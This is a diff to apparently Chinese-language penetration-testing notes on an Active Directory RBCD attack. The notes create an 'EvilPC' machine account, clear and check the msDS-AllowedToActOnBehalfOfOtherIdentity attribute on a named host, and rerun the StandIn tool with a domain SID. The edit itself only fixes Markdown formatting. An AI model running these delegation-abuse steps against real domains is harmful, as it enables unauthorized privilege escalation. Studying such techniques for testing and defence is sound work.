@@ -77,14 +77,14 @@ New-ADComputer -Name "EvilPC" -SamAccountName "EvilPC$" -Path "CN=Computers,DC=s
 ```
 
 ## 若需要先清除現有的 RBCD 屬性再重新設定
-```powershell# 清除現有的 msDS-AllowedToActOnBehalfOfOtherIdentity
+powershell# 清除現有的 msDS-AllowedToActOnBehalfOfOtherIdentity
 Set-ADComputer -Identity "EC2AMAZ-V903HM1" -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
-```
+
 
 # 確認已清除 
 Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | 
   Select-Object msDS-AllowedToActOnBehalfOfOtherIdentity
-清除後重新執行 StandIn：
+## 清除後重新執行 StandIn：
 powershell.\StandIn_v13_Net45.exe --computer EC2AMAZ-V903HM1 --sid S-1-5-21-807542958-1552376634-88705
 
 
